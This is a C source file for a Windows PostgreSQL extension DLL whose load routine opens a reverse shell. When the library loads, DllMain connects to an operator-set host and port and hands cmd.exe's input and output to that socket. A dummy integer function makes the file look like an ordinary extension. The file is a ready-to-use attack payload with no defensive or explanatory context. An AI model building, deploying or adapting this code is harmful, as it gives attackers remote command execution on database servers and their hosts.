#define PG_REVSHELL_CALLHOME_SERVER "X.X.X.X" // YOUR LOCAL HOST
#define PG_REVSHELL_CALLHOME_PORT "4444" // YOUR LOCAL PORT

#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <winsock2.h>
 
#pragma comment(lib,"ws2_32")
 
#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif
 
#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS
 
BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL,
                    _In_ DWORD fdwReason,
                    _In_ LPVOID lpvReserved)
{
    WSADATA wsaData;
    SOCKET wsock;
    struct sockaddr_in server;
    char ip_addr[16];
    STARTUPINFOA startupinfo;
    PROCESS_INFORMATION processinfo;
 
    char *program = "cmd.exe";
    const char *ip = PG_REVSHELL_CALLHOME_SERVER;
    u_short port = atoi(PG_REVSHELL_CALLHOME_PORT);
 
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    wsock = WSASocket(AF_INET, SOCK_STREAM,
                      IPPROTO_TCP, NULL, 0, 0);
 
    struct hostent *host;
    host = gethostbyname(ip);
    strcpy_s(ip_addr, sizeof(ip_addr),
             inet_ntoa(*((struct in_addr *)host->h_addr)));
 
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip_addr);
 
    WSAConnect(wsock, (SOCKADDR*)&server, sizeof(server),
              NULL, NULL, NULL, NULL);
 
    memset(&startupinfo, 0, sizeof(startupinfo));
    startupinfo.cb = sizeof(startupinfo);
    startupinfo.dwFlags = STARTF_USESTDHANDLES;
    startupinfo.hStdInput = startupinfo.hStdOutput =
                            startupinfo.hStdError = (HANDLE)wsock;
 
    CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
                  NULL, NULL, &startupinfo, &processinfo);
 
    return TRUE;
}
 
#pragma warning(pop) /* re-enable 4996 */
 
/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum dummy_function(PG_FUNCTION_ARGS);
 
PG_FUNCTION_INFO_V1(add_one);
 
Datum dummy_function(PG_FUNCTION_ARGS)
{
    int32 arg = PG_GETARG_INT32(0);
 
    PG_RETURN_INT32(arg + 1);
}
